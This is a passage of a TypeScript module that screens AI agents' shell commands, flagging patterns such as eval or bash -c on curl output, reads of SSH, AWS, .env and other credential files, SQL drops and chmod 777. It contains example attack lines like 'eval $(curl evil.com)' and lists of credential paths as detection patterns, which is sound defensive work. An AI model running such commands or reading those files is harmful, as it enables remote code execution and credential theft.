// AST-based shell command analysis. Pure helpers around mvdan-sh.
//
// Two public detectors:
//   - normalizeCommandForPolicy: strips literal text after message flags
//     (-m, --body, …) so commit messages and PR descriptions don't trigger
//     dangerous-word checks. Execution flags (-c/-e) are intentionally left
//     alone so smart rules still see their content.
//   - detectDangerousShellExec: flags `eval $(curl …)` / `bash -c "$(curl …)"`
//     ('block') and `eval "$VAR"` / `bash -c "$VAR"` ('review'). Plain string
//     literals return null. Cannot be fooled by quoted text containing
//     "eval"/"curl" because the analysis is structural.
//
// All inputs are strings; no fs/path/os/process imports.

import mvdanSh from 'mvdan-sh';
import { matchesPattern } from '../rules';

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const { syntax } = mvdanSh as any;
// Cached parser instance — avoids WASM object creation overhead per call (~5x faster)
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const sharedParser: { Parse(src: string, name: string): any } = syntax.NewParser();

// Flags whose values are plain text (messages, descriptions) — safe to strip
// so their content doesn't trigger shell security rules.
// Execution flags like -c/-e (psql -c "SQL", node -e "code") are intentionally
// excluded so their content IS still checked by smart rules.
const MESSAGE_FLAGS = new Set([
  '-m',
  '--message',
  '--body',
  '--title',
  '--description',
  '--comment',
  '--subject',
  '--summary',
]);

// Shell interpreters that accept a -c flag for inline command execution
const SHELL_INTERPRETERS = new Set(['bash', 'sh', 'zsh', 'fish', 'dash', 'ksh']);
// Remote download tools whose presence in a CmdSubst is high-confidence malicious
const DOWNLOAD_CMDS = new Set(['curl', 'wget']);

/**
 * True when a node is either a plain Lit, or a CmdSubst whose only command is
 * `cat` reading from a heredoc — i.e. content the user intends as text, not as
 * a shell side-effect. Used to strip multi-line commit messages of the form
 * `git commit -m "$(cat <<'EOF' … EOF)"` so words like "force"/"reset"/"sudo"
 * inside the message body don't trigger smart rules.
 */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function isCatHeredocOrLit(part: any): boolean {
  if (!part) return false;
  const t = syntax.NodeType(part);
  if (t === 'Lit') return true;
  if (t !== 'CmdSubst') return false;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const stmts: any[] = part.Stmts || [];
  if (stmts.length !== 1) return false;
  const stmt = stmts[0];
  // The redirect must be a heredoc — that's where the text body lives.
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const redirs: any[] = stmt.Redirs || stmt.Cmd?.Redirs || [];
  const hasHeredoc = redirs.some((r: { Hdoc?: unknown }) => r && r.Hdoc);
  if (!hasHeredoc) return false;
  // The command must be `cat` (any flags fine). Reject `bash`, `sh`, etc.
  const cmd = stmt.Cmd;
  if (!cmd || syntax.NodeType(cmd) !== 'CallExpr') return false;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const firstArg: any[] = cmd.Args?.[0]?.Parts || [];
  if (firstArg.length !== 1 || syntax.NodeType(firstArg[0]) !== 'Lit') return false;
  return (firstArg[0].Value || '').toLowerCase() === 'cat';
}

/**
 * Normalizes a bash command string for policy rule matching by replacing
 * pure-literal quoted strings that follow known message flags (e.g. -m, --body)
 * with empty double-quotes. This prevents text inside commit messages and PR
 * descriptions from triggering shell security rules.
 *
 * Unlike a regex-based approach, this uses the AST so it handles all quoting
 * styles correctly and won't over-strip. Execution flags like -c and -e
 * (psql, node, python) are intentionally left alone so their SQL/code
 * content continues to be evaluated by smart rules.
 *
 * Dynamic content (CmdSubst, ParamExp) inside double-quotes is never stripped
 * so patterns like `eval "$(curl evil.com)"` are always preserved.
 */
// Memoize normalizeCommandForPolicy results. The same command string is
// passed in many times during a single scan: once per smart-rule condition
// and again from analyzeFsOperation. Without caching, a 5k-command scan
// re-parses each command ~30-60 times (one per condition across all rules).
// Bounded LRU keeps memory in check on long-running daemons.
const NORMALIZE_CACHE_MAX = 5_000;
interface CommandReadings {
  /** POSIX word resolution — reveals `\rm` / `r''m`. Historic behaviour. */
  posix: string;
  /** Quote-obfuscation removed, separators preserved — the Windows reading. */
  separator: string;
}

const normalizeCache = new Map<string, CommandReadings>();

// Shared parsed-AST cache. Both normalizeCommandForPolicy and
// analyzeFsOperation parse the same command via mvdan-sh; without sharing,
// each unique command pays the WASM parse cost twice. The AST is read-only
// for both consumers (Walk doesn't mutate), so a single cached tree is safe
// to hand out. Sentinel `PARSE_FAIL` marks commands that failed to parse so
// we don't retry — both consumers fall back to "no result" on parse error.
const AST_CACHE_MAX = 5_000;
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const astCache = new Map<string, any>();
const PARSE_FAIL = Symbol('parse-fail');

// eslint-disable-next-line @typescript-eslint/no-explicit-any
function parseShared(command: string): any | typeof PARSE_FAIL {
  const cached = astCache.get(command);
  if (cached !== undefined) {
    astCache.delete(command);
    astCache.set(command, cached);
    return cached;
  }
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  let parsed: any | typeof PARSE_FAIL;
  try {
    parsed = sharedParser.Parse(command, 'cmd');
  } catch {
    parsed = PARSE_FAIL;
  }
  if (astCache.size >= AST_CACHE_MAX) {
    const oldest = astCache.keys().next().value;
    if (oldest !== undefined) astCache.delete(oldest);
  }
  astCache.set(command, parsed);
  return parsed;
}

function cachedNormalize(command: string, compute: () => CommandReadings): CommandReadings {
  const hit = normalizeCache.get(command);
  if (hit !== undefined) {
    // Move to most-recent on access (Map iteration order = insertion order).
    normalizeCache.delete(command);
    normalizeCache.set(command, hit);
    return hit;
  }
  const result = compute();
  if (normalizeCache.size >= NORMALIZE_CACHE_MAX) {
    // Evict the oldest entry (first in iteration order).
    const oldest = normalizeCache.keys().next().value;
    if (oldest !== undefined) normalizeCache.delete(oldest);
  }
  normalizeCache.set(command, result);
  return result;
}

/**
 * The POSIX reading of a command. Kept as the single-string API every existing
 * caller (canonical.ts, the detectors, `explain`) already depends on.
 */
export function normalizeCommandForPolicy(command: string): string {
  return commandReadingsImpl(command).posix;
}

/**
 * Every reading of a command that a rule must be tested against.
 *
 * `\` is an ESCAPE in POSIX and a SEPARATOR in cmd/PowerShell, and nothing at
 * rule-evaluation time knows which shell will run the command — `Bash` on
 * Windows may be Git Bash or cmd. Collapsing to one reading therefore destroys
 * matches that exist in the text, and a destroyed match is a silent ALLOW: of 7
 * realistic Windows shapes of the same jailed path, the POSIX reading alone
 * caught 3.
 *
 * So both readings are returned and `matches` fires if ANY of them matches —
 * the repo's `combine by strictness` rule (two checks on one input resolve by
 * MAX, never by order). De-duplicated, so an ordinary POSIX command still costs
 * exactly one regex test.
 *
 * This deliberately replaces guessing the shell from a token prefix (reverted
 * in 5985b5a, which exempted whole tokens from de-obfuscation and opened a
 * bypass). Guessing from a prefix and assuming POSIX always are the same
 * mistake in opposite directions; evaluating both readings removes the guess.
 */
export function commandReadings(command: string): string[] {
  const r = commandReadingsImpl(command);
  return r.separator === r.posix ? [r.posix] : [r.posix, r.separator];
}

function commandReadingsImpl(command: string): CommandReadings {
  return cachedNormalize(command, () => normalizeCommandForPolicyImpl(command));
}

function normalizeCommandForPolicyImpl(command: string): CommandReadings {
  const f = parseShared(command);
  // fail open for FPs, not FNs — both readings fall back to the raw text
  if (f === PARSE_FAIL) return { posix: command, separator: command };
  try {
    // Two kinds of in-place edits, applied together right-to-left so offsets
    // stay valid: (1) message-flag value strips (-m "msg" → -m ""), and
    // (2) intra-word de-obfuscation rewrites (r''m → rm).
    const strips: Array<[number, number]> = [];
    const rewrites: Array<[number, number, string]> = [];
    // The SEPARATOR reading's rewrites: quote-obfuscation removed, but every
    // other character (crucially `\`) left exactly as written. See
    // commandReadings() for why one reading is not enough.
    const quoteOnlyRewrites: Array<[number, number, string]> = [];
    const msgSpans = new Set<string>();

    syntax.Walk(f, (node: unknown) => {
      if (!node) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (syntax.NodeType(n) !== 'CallExpr') return true;

      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const args: any[] = n.Args || [];

      // ── 1. Strip message-flag values (commit messages, descriptions) ──
      for (let i = 0; i < args.length - 1; i++) {
        // Check if this arg is a known message flag (single Lit word starting with -)
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const argParts: any[] = args[i].Parts || [];
        if (argParts.length !== 1 || syntax.NodeType(argParts[0]) !== 'Lit') continue;
        const flagVal: string = argParts[0].Value || '';
        if (!MESSAGE_FLAGS.has(flagVal.toLowerCase())) continue;

        // The next arg (a Word) — strip it if its single Part is a pure-literal quoted string.
        // args[i+1] is always a Word node; the quote type lives in Parts[0].
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const next = args[i + 1] as any;
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const nextParts: any[] = next.Parts || [];
        if (nextParts.length !== 1) continue;
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const quotedNode = nextParts[0] as any;
        const nt: string = syntax.NodeType(quotedNode);
        const markStrip = (): void => {
          const s = next.Pos().Offset();
          const e = next.End().Offset();
          strips.push([s, e]);
          msgSpans.add(`${s}:${e}`); // exclude from de-obfuscation below
        };
        if (nt === 'SglQuoted') {
          markStrip();
        } else if (nt === 'DblQuoted') {
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const innerParts: any[] = quotedNode.Parts || [];
          const allLit =
            innerParts.length === 0 ||
            innerParts.every((p: unknown) => syntax.NodeType(p) === 'Lit');
          if (allLit) {
            markStrip();
          } else if (innerParts.every((p: unknown) => isCatHeredocOrLit(p))) {
            // Pattern: -m "$(cat <<'EOF' … EOF)" — common for multi-line
            // commit messages. The heredoc body is a literal that the agent
            // intends as message text, so stripping it matches user intent.
            // Only strip when every dynamic part is a cat-heredoc (no $(date),
            // no $VAR mixed in) to avoid stripping intentional dynamic values.
            markStrip();
          }
        }
      }

      // ── 2. De-obfuscate command/arg tokens in place (r''m, \rm, pu''sh) ──
      // Collapse intra-word quote/escape obfuscation so destructive rules match
      // the real token. Only words that resolve to a SINGLE structural token
      // (no whitespace) AND differ from their source are rewritten — never
      // multi-word data strings (those keep their quotes) and never the
      // message-flag values stripped above. Operators/positions are preserved,
      // so the rules' command-boundary anchoring still holds.
      for (const arg of args) {
        const s = arg.Pos().Offset();
        const e = arg.End().Offset();
        if (msgSpans.has(`${s}:${e}`)) continue; // already a stripped message value
        const resolved = resolveWordLiteral(arg);
        if (resolved === null) continue; // dynamic ($VAR / $(...)) — leave as-is
        const source = command.slice(s, e);
        if (resolved === source) continue; // not obfuscated
        if (resolved === '' || /\s/.test(resolved)) continue; // data string, not a token
        rewrites.push([s, e, resolved]);
        // Same token, but resolving ONLY the quote obfuscation. For `r''m` this
        // equals `resolved` (rm); for `C:\Users\x\.aw''s` it yields
        // `C:\Users\x\.aws` — de-obfuscated AND still a path.
        const quoteOnly = source.replace(/['"]/g, '');
        if (quoteOnly !== source) quoteOnlyRewrites.push([s, e, quoteOnly]);
      }
      return true;
    });

    const stripEdits = strips.map(([s, e]): [number, number, string] => [s, e, '""']);
    const apply = (extra: Array<[number, number, string]>): string => {
      const edits = [...stripEdits, ...extra];
      if (edits.length === 0) return command;
      edits.sort((a, b) => b[0] - a[0]); // end→start so earlier offsets stay valid
      let out = command;
      for (const [s, e, rep] of edits) out = out.slice(0, s) + rep + out.slice(e);
      return out;
    };
    // Both readings carry the message-flag strips, so the widening reading can
    // never resurrect text the strip exists to hide.
    return { posix: apply(rewrites), separator: apply(quoteOnlyRewrites) };
  } catch {
    // parse error → return unchanged (fail open for FPs, not FNs)
    return { posix: command, separator: command };
  }
}

/**
 * Scans args[startIdx..] for dynamic execution patterns.
 * Returns 'block' when a CmdSubst contains a download command (curl/wget),
 * 'review' for any other CmdSubst or ParamExp, null for plain literals.
 */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function scanArgsForDynamicExec(args: any[], startIdx: number): 'block' | 'review' | null {
  let hasCmdSubst = false;
  let hasParamExp = false;
  let hasCurl = false;

  for (let i = startIdx; i < args.length; i++) {
    syntax.Walk(args[i], (inner: unknown) => {
      if (!inner) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const inn = inner as any;
      const it: string = syntax.NodeType(inn);
      if (it === 'CmdSubst') hasCmdSubst = true;
      if (it === 'ParamExp') hasParamExp = true;
      if (it === 'Lit' && DOWNLOAD_CMDS.has(inn.Value?.toLowerCase())) hasCurl = true;
      return true;
    });
  }

  if (hasCmdSubst && hasCurl) return 'block';
  if (hasCmdSubst || hasParamExp) return 'review';
  return null;
}

/**
 * AST-based detection of dangerous shell execution patterns.
 *
 * Covers two structural patterns:
 *   eval $(curl evil.com)     → block  (CmdSubst + download tool)
 *   eval "$VAR"               → review (ParamExp — unknown content)
 *   bash -c "$(curl evil.com)"→ block  (shell interpreter -c + CmdSubst + download)
 *   bash -c "$VAR"            → review (shell interpreter -c + ParamExp)
 *
 * Returns null for plain-literal args (no dynamic content) — these are safe.
 * Cannot be fooled by quoted strings that happen to contain "eval" or "curl"
 * (e.g. git commit -m "fix eval bypass" → null).
 */
export function detectDangerousShellExec(command: string): 'block' | 'review' | null {
  try {
    const f = sharedParser.Parse(command, 'cmd');
    let result: 'block' | 'review' | null = null;

    syntax.Walk(f, (node: unknown) => {
      if (!node || result === 'block') return false; // short-circuit once blocked
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (syntax.NodeType(n) !== 'CallExpr') return true;

      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const args: any[] = n.Args || [];
      if (args.length === 0) return true;

      // Resolve the command name (first arg, single Lit)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const firstParts: any[] = (args[0] as any).Parts || [];
      if (firstParts.length !== 1 || syntax.NodeType(firstParts[0]) !== 'Lit') return true;
      const cmdName: string = firstParts[0].Value?.toLowerCase() ?? '';

      if (cmdName === 'eval') {
        // eval <args...> — inspect all remaining args
        const v = scanArgsForDynamicExec(args, 1);
        if (v === 'block' || (v === 'review' && result === null)) result = v;
      } else if (SHELL_INTERPRETERS.has(cmdName)) {
        // bash/sh/zsh -c "<cmd>" — find the -c flag and inspect its value arg
        for (let i = 1; i < args.length - 1; i++) {
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const flagParts: any[] = (args[i] as any).Parts || [];
          if (
            flagParts.length !== 1 ||
            syntax.NodeType(flagParts[0]) !== 'Lit' ||
            flagParts[0].Value !== '-c'
          )
            continue;
          const v = scanArgsForDynamicExec(args, i + 1);
          if (v === 'block' || (v === 'review' && result === null)) result = v;
          break;
        }
      }

      return true;
    });

    return result;
  } catch {
    return null; // parse error → fail open (don't block on uncertainty)
  }
}

/** @deprecated Use detectDangerousShellExec — kept for backwards compatibility */
export const detectDangerousEval = detectDangerousShellExec;

// ── Filesystem-operation AST detector ──────────────────────────────────────
//
// Replaces regex rules that produced FPs by matching dangerous strings inside
// JSON args, heredoc bodies, or chained-command path segments unrelated to the
// actual operation. The detector walks the AST, finds rm/cat/read-tool calls,
// and resolves *each call's* target paths against:
//   - sensitive credential prefixes (~/.ssh, ~/.aws, .env, ~/.netrc, …)
//   - $HOME root (with allow-list for tool-managed cache paths)
// returning a structured verdict per call.

// Every command that puts a file's CONTENTS where the agent can see them.
//
// This set had 14 entries while the project-jail shield's regex rule named 36,
// and since that rule is suppressed for bash (AST_FS_REGEX_RULES) this set was
// the only gate — so the 22-name delta was ungated for every AI agent and
// `strings .env` read a credential file with no verdict at all.
//
// The membership test is "does it emit file contents", not "is it a pager":
// `strings`/`xxd`/`od`/`hexdump` dump bytes, `jq`/`yq` parse and print,
// `sort`/`uniq`/`tac`/`nl` echo lines, `sed`/`awk`/`cut`/`tr` transform to
// stdout, and the grep family prints matching lines — which is all an
// exfiltrator needs. Adding a name here widens EVERY SENSITIVE_PATH_RULES entry
// (.ssh, .aws, .env, credentials), not just the one being repaired.
const FS_READ_TOOLS = new Set([
  'cat',
  'less',
  'head',
  'tail',
  'bat',
  'more',
  'open',
  'print',
  'nano',
  'vim',
  'vi',
  'emacs',
  'code',
  'type',
  // — the 22 that were missing —
  'grep',
  'egrep',
  'fgrep',
  'rg',
  'ag',
  'ack',
  'awk',
  'gawk',
  'sed',
  'cut',
  'tr',
  'jq',
  'yq',
  'od',
  'xxd',
  'hexdump',
  'strings',
  'sort',
  'uniq',
  'tac',
  'nl',
  'dd',
]);

// Fast-path screen: the AST detector only fires when one of these tools is
// the *command name of a CallExpr* — i.e. it appears at start-of-command
// position. mvdan-sh produces a CallExpr only when the token sits at:
//   start-of-string, after pipe/and/or/semicolon/ampersand/newline, or
//   immediately inside `$(`, backticks, `(`, `{`.
// Anchoring the regex to those positions stops 99%+ of "matches inside an
// argument string / hyphenated token / commit message" wasted parses
// (e.g. `git log | head -20` still matches; `npm run type-check` no longer
// passes prescreen because `type` is mid-token, never a CallExpr name).
//
// DERIVED from FS_READ_TOOLS, never hand-written beside it. It used to be a
// second copy of the same fourteen names, and two lists that must agree but are
// maintained separately is how a widening ships half-applied: adding a reader to
// the Set alone changes nothing, because this prescreen returns before the AST
// is ever parsed — the diff looks complete and the gate stays open. Deriving it
// makes that failure unrepresentable.
//
// `rm` is joined in because the detector also handles deletion; it is not a
// reader and deliberately does not live in FS_READ_TOOLS.
const FS_OP_PRESCREEN_RE = new RegExp(
  `(?:^|[\\s|;&(\`\\n])(?:rm|${[...FS_READ_TOOLS]
    // Escape defensively: every current name is bare word characters, but a
    // future addition with a `.` or `+` would otherwise become a wildcard and
    // silently widen the prescreen.
    .map((t) => t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))
    .join('|')})\\b`
);

// Cache directories under $HOME that are tool-managed. Deleting them is safe
// (the tool re-populates), so `rm -rf` of these paths must not block.
// Conservative list — extend by user request, not by guessing.
const HOME_CACHE_ALLOWLIST = [
  '.cache',
  '.npm/_npx',
  '.npm/_cacache',
  '.cargo/registry',
  '.gradle/caches',
  '.gradle/.tmp',
  '.m2/repository',
  '.pnpm-store',
  '.yarn/cache',
  '.yarn/.cache',
  '.cache/pip',
  '.local/share/Trash',
  '.rustup/downloads',
];

/**
 * Stands in for a word segment whose text we could not resolve — a `$VAR`, a
 * command substitution, an arithmetic expansion. NUL, deliberately: it cannot
 * occur in a filename on any supported platform, so it can never be confused
 * with real path text. A space would be wrong — a space is legal in a filename
 * (`C:\\Users\\John Smith\\...`).
 *
 * It is load-bearing rather than cosmetic. Sensitive-path matchers anchor on
 * `^` or a separator, so a sentinel that is NEITHER makes the widening
 * self-limiting: `$HOME/.ssh/id_rsa` still matches (the `/` before `.ssh` is
 * literal), while `$PREFIX.env` does not (nothing separates the unknown text
 * from `.env`, and we genuinely do not know what `$PREFIX` holds).
 */
export const PATH_SEGMENT_SENTINEL = '\0';

/**
 * Exported so an invariant spec can iterate the LIVE rule set rather than a
 * copy that goes stale. Mirrors `SENSITIVE_PATH_REGEXES` in dlp/index.ts,
 * exported for the same reason.
 *
 * The invariant being guarded (see PATH_SEGMENT_SENTINEL): every matcher here
 * must anchor its sensitive segment on `^` or a path separator. Resolution of
 * a partially-dynamic word depends on it — `$PREFIX.env` must NOT read as a
 * `.env` file, and the only thing that distinguishes it from `$HOME/.env` is
 * whether a separator precedes the segment. An unanchored matcher would lose
 * that distinction silently, so the property is asserted, not assumed.
 */
export const SENSITIVE_PATH_RULES: Array<{
  rule: string;
  reason: string;
  match: (p: string) => boolean;
  /** Per-rule verdict; defaults to 'block' when omitted. Credentials
   *  (.netrc / .npmrc / .docker / .kube / gcloud) use 'review' rather
   *  than 'block' — these config files have legitimate diagnostic
   *  read needs ("which registry am I configured for"), so we ask
   *  rather than hard-stop, matching the any-tool rule's verdict. */
  verdict?: 'block' | 'review';
}> = [
  {
    rule: 'shield:project-jail:block-read-ssh',
    reason: 'Reading SSH private keys is blocked by project-jail shield',
    match: (p) => /(^|[\\/])\.ssh[\\/]/i.test(p),
  },
  {
    rule: 'shield:project-jail:block-read-aws',
    reason: 'Reading AWS credentials is blocked by project-jail shield',
    match: (p) => /(^|[\\/])\.aws[\\/]/i.test(p),
  },
  {
    // Mirrors the JSON shield's `.env` pattern (project-jail.json's
    // block-read-env-any-tool) so the AST FS-op path catches the
    // same set the regex shield does — including Next.js / Vite's
    // `.env.<env>.local` double-suffix overrides which are commonly
    // gitignored AND commonly contain real secrets.
    //
    // Intentional non-matches (dev fixtures): .env.example, .env.sample,
    // .env.template, .env.test, .envrc. See shields.test.ts:983-995
    // for the canonical test-asserted contract.
    rule: 'shield:project-jail:block-read-env',
    reason: 'Reading .env files is blocked by project-jail shield',
    // Structural, not a list. The previous form enumerated seven suffixes and
    // anchored on `$`, so `.env.prod`, `.env.ci` and `.env.local.bak` — all
    // gitignored, all routinely holding real secrets — were never covered. A
    // hand-written list of what to protect is only ever as complete as the day
    // it was typed; this says "`.env` plus any suffix chain" and then names the
    // exceptions, which is the direction that fails safe.
    //
    //   \.env          the segment itself
    //   (?![\w-])      a boundary, so `.environment` and `.envrc` are NOT .env
    //                  files. Without it a flat suffix class swallows both.
    //   (?![\w-])      a boundary, so `.environment` and `.envrc` are NOT .env
    //   [\w.-]*$       any suffix chain. Flat class, no nested quantifier —
    //                  `(\.[\w-]+)*` reads the same but is rejected by
    //                  safe-regex2, and this pattern runs on the hook hot path.
    //
    // The two exclusions are NOT the same shape, because the words do not mean
    // the same thing:
    //
    //   (?!\.(?:example|sample|template)\b)  — "this file is a fixture", and it
    //     stays a fixture whatever follows, so `.env.example.md` is allowed too.
    //     These are checked into git by convention: already public, so blocking
    //     them buys nothing and costs the most common legitimate agent read.
    //
    //   (?!\.test$)  — anchored, because `test` names an ENVIRONMENT, not a
    //     fixture. `.env.test` is the committed template and stays allowed, but
    //     `.env.test.local` is gitignored by the `.env*.local` convention and
    //     holds real values, so it must block. Using `\b` here — the obvious
    //     symmetry — silently exempts every `.env.test.*` file.
    //
    // shields.test.ts:983-995 is the canonical contract; keep both in step.
    match: (p) =>
      /(?:^|[\\/])\.env(?![\w-])(?!\.(?:example|sample|template)\b)(?!\.test$)[\w.-]*$/i.test(p),
  },
  {
    // verdict: 'review' (not 'block') is a deliberate design choice
    // documented in commit 29327a8. SSH keys and AWS credentials are
    // cryptographic material with no legitimate read use-case for
    // an AI agent → hard `block`. But .netrc / .npmrc / .docker /
    // .kube / gcloud are CONFIG files that hold tokens AND have
    // legitimate diagnostic reads ("which registry am I configured
    // for", "what cluster am I on"). Hard-blocking those creates
    // friction without much safety win because the review gate
    // still catches genuine exfiltration attempts.
    //
    // The review gate FAILS CLOSED on timeout (daemon.approvalTimeoutMs
    // returns a deny verdict via the orchestrator's timeout branch),
    // so a stuck or unattended approval does NOT silently grant
    // credential access. If the threat model demands strict block,
    // a future per-shield strict-mode toggle is the right fix —
    // not a regex-level upgrade here.
    rule: 'shield:project-jail:review-read-credentials',
    reason: 'Reading credential files requires approval (project-jail shield)',
    verdict: 'review',
    match: (p) =>
      // .kube/config holds Kubernetes cluster credentials and was
      // flagged as missing by the node9-pr-agent review (the comment
      // above mentioned .kube but the regex didn't include it — a
      // textbook code-comment vs code drift). The JSON shield's
      // review-read-credentials-any-tool already had it. Now aligned.
      /(?:credentials\.json|\.netrc|\.npmrc|\.docker[\\/]config\.json|gcloud[\\/]credentials|\.kube[\\/]config)$/i.test(
        p
      ),
  },
];

/**
 * Render a resolved path for a HUMAN. The sentinel is an internal matching
 * marker and must never leave this layer wearing its raw form.
 *
 * NUL is invisible in a terminal, so `<NUL>/.netrc` displays as `/.netrc` — a
 * file at the filesystem root that the agent never touched. A report that names
 * the WRONG file is worse than one that says "I could not resolve this part",
 * so the unknown segment is made to look unknown.
 *
 * Reach, checked rather than assumed: FsOpVerdict.path flows to
 * CanonicalFinding.subjectPath and from there into the local report render.
 * toScanFinding drops subjectPath and maps ast-fs-op to null, so the SaaS never
 * receives it — which matters, because Postgres rejects a 0x00 byte in a text
 * column and this would have been a failed insert rather than a bad string.
 * evaluatePolicy does not carry `path` into the verdict at all, so the live
 * gate was never affected.
 */
function displayPath(resolved: string): string {
  return resolved.split(PATH_SEGMENT_SENTINEL).join('$?');
}

export interface FsOpVerdict {
  ruleName: string;
  verdict: 'block' | 'review';
  reason: string;
  /** The actual path argument from the user's command — for explainability. */
  path: string;
}

// Tool names across all three supported agents that carry a shell command in
// `args.command`. Both the CLI scan (per-agent in scan.ts) and the live hook's
// AST FS-op tier need to know which calls are bash-shaped.
export const BASH_TOOL_NAMES = new Set<string>([
  'bash',
  'execute_bash',
  'run_shell_command',
  'shell',
  'exec_command',
]);

export function isBashTool(toolName: string): boolean {
  return BASH_TOOL_NAMES.has(toolName.toLowerCase());
}

// Names of regex-based smart rules whose detection is provided by
// analyzeFsOperation. When the AST detector ran on a bash command (regardless
// of whether AST returned a verdict) these regex rules must be suppressed —
// they FP on JSON args, heredocs, and chained-command segments that AST
// handles correctly. See scan.ts:1059 for the original CLI usage.
export const AST_FS_REGEX_RULES = new Set<string>([
  'block-rm-rf-home',
  'shield:project-jail:block-read-ssh',
  'shield:project-jail:block-read-aws',
  'shield:project-jail:block-read-env',
  'shield:project-jail:review-read-credentials',
  // SQL-DDL is now owned by the AST detector (analyzeSqlDestructive) so the
  // raw-regex smart rule is suppressed for bash — its cond1 read a grep
  // alternation's `|` as a shell pipe (`grep "…|mysql…"` → false positive).
  'review-drop-truncate-shell',
  // chmod 777 is now owned by the AST detector (analyzeChmod777) so the raw-
  // regex smart rule is suppressed for bash — it matched `chmod 777` inside a
  // `node -e` / `python -c` string literal (a detection pattern, not a run
  // command) → false positive.
  'shield:filesystem:review-chmod-777',
]);

// Database CLIs that actually execute SQL. Detection requires one of these to be
// a REAL command (analyzeShellCommand actions) — not a word inside a quoted grep
// pattern — which is what makes this AST-aware instead of a raw-string match.
const SQL_DB_CLIS = new Set<string>([
  'psql',
  'mysql',
  'mariadb',
  'sqlite3',
  'sqlplus',
  'cockroach',
  'clickhouse-client',
  'mongo',
  'mongosh',
]);
const SQL_DDL_RE = /\b(DROP|TRUNCATE)\s+(TABLE|DATABASE|SCHEMA|INDEX)\b/i;

/**
 * AST-aware SQL-DDL detector. Fires only when a database CLI is an actual
 * command in the line (its first-word, via analyzeShellCommand actions) AND the
 * command carries a DROP/TRUNCATE DDL statement. This is the structural
 * replacement for the FP-prone `review-drop-truncate-shell` regex rule, which
 * matched a DB-CLI name and "DROP TABLE" anywhere in the raw string — so
 * `grep -riE "…|mysql|drop table…"` (a read-only search) tripped it.
 *
 * Returns a 'review' verdict (DDL via a DB shell is human-approval-worthy but
 * not auto-block) or null. Pure.
 */
export function analyzeSqlDestructive(
  command: string
): { ruleName: string; verdict: 'review'; reason: string; description: string } | null {
  // Cheap pre-check before parsing — most commands have no DDL keyword.
  if (!SQL_DDL_RE.test(command)) return null;
  const { actions } = analyzeShellCommand(command);
  if (!actions.some((a) => SQL_DB_CLIS.has(a))) return null; // no real DB CLI command
  return {
    ruleName: 'review-drop-truncate-shell',
    verdict: 'review',
    reason: 'SQL DDL destructive statement inside a shell command',
    description:
      'The AI wants to drop or truncate a database table via the shell. This permanently deletes the table structure or all its data.',
  };
}

// Permission tokens that make a chmod a privilege-escalation concern. The
// union of the two detection paths this consolidates: the filesystem shield's
// raw regex matched `777`/`a+rwx`, while the scan path (canonical.ts) matched
// `777`/`0777`/`+x`. Neither was a superset, so each missed cases the other
// caught — the union closes both gaps and aligns live gate + CLI scan.
// World-WRITABLE modes only. `+x` is intentionally excluded: it grants execute
// (→ 775 under a normal umask), never write, so `chmod +x script.sh` is NOT
// world-writable and must not trip the "any user can modify it" review.
const CHMOD_OPEN_PERM_TOKENS = new Set(['777', '0777', 'a+rwx']);

// Command wrappers that run a wrapped command (`sudo chmod 777`, `xargs chmod
// 777`, `env FOO=bar chmod 777`, `timeout 5 chmod 777`). mvdan-sh parses these
// as a single CallExpr whose name is the wrapper, so `chmod` is an argument,
// never the action. Without unwrapping, the raw regex caught `sudo chmod 777`
// and the AST detector would not — a coverage regression. We look for `chmod`
// anywhere in a wrapper's args. `echo chmod 777` is NOT affected: `echo` is
// not a wrapper, so chmod as a non-wrapper argument stays unflagged.
const COMMAND_WRAPPERS = new Set([
  'sudo',
  'doas',
  'env',
  'xargs',
  'time',
  'nice',
  'ionice',
  'nohup',
  'setsid',
  'stdbuf',
  'timeout',
  'command',
  'exec',
]);

/**
 * True when the command runs `chmod` (directly or via a command wrapper) with a
 * world-open MODE argument. Walks the AST and, for each chmod invocation, reads
 * the FIRST non-flag arg after `chmod` — the mode slot per `chmod [OPTION]...
 * MODE FILE...` — and checks only THAT against CHMOD_OPEN_PERM_TOKENS. Binding
 * the permission check to the mode slot (not a token-bag scan) is what keeps a
 * safe-mode chmod on a path that merely contains "777" (e.g. `chmod 644 ./777`)
 * from false-positiving. Quote/escape obfuscation (`c\hmod`) is still caught
 * because resolveWordLiteral de-obfuscates each word.
 */
function chmodHasOpenPermMode(command: string): boolean {
  const f = parseShared(command);
  if (f === PARSE_FAIL) return false; // fail open for FPs, not FNs
  let found = false;
  try {
    syntax.Walk(f, (node: unknown) => {
      if (!node || found) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (syntax.NodeType(n) !== 'CallExpr') return true;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const words: (string | null)[] = (n.Args || []).map((a: any) => resolveWordLiteral(a));
      if (words.length === 0) return true;
      const name = (words[0] ?? '').toLowerCase();
      // chmod as the command name, or as a word inside a wrapper's args.
      let idx = -1;
      if (name === 'chmod') idx = 0;
      else if (COMMAND_WRAPPERS.has(name))
        idx = words.findIndex((w, i) => i > 0 && w?.toLowerCase() === 'chmod');
      if (idx < 0) return true;
      // Mode = first non-flag slot after chmod (skip -R, -v, --, …). The slot is
      // consumed once reached, literal or dynamic — a dynamic mode is unknowable
